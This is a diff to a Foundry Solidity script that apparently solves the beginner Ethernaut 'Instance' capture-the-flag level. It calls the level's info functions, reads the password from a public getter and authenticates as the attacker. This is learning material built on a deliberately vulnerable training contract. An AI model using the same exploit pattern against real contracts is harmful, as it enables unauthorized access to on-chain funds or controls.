@@ -20,7 +20,7 @@ contract InstanceScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Instance(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Instance(0xc0f7DD13E86Cd3B4F765AEE2350f6C211CBFc49c); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +32,7 @@ contract InstanceScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Instance();
+            target = new Instance("P@SSW0rd#123!!!");
             vm.stopBroadcast();
         }
     }
@@ -44,5 +44,21 @@ contract InstanceScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        console.log("target   : %s", address(target));
+
+        console.log("[Exploit]");
+        console.log("info() : %s", target.info());
+        console.log("info1() : %s", target.info1());
+        console.log("info2() : %s", target.info2("hello"));
+        console.log("infoNum() : %s", target.infoNum());
+        console.log("info42() : %s", target.info42());
+        console.log("theMethodName() : %s", target.theMethodName());
+        console.log("method7123949() : %s", target.method7123949());
+        string memory password = target.password();
+        console.log("password() : %s", target.password());
+        vm.startBroadcast(attacker);
+        target.authenticate(password);
+        vm.stopBroadcast();
+        console.log("cleared() : %s", target.getCleared());
     }
 }
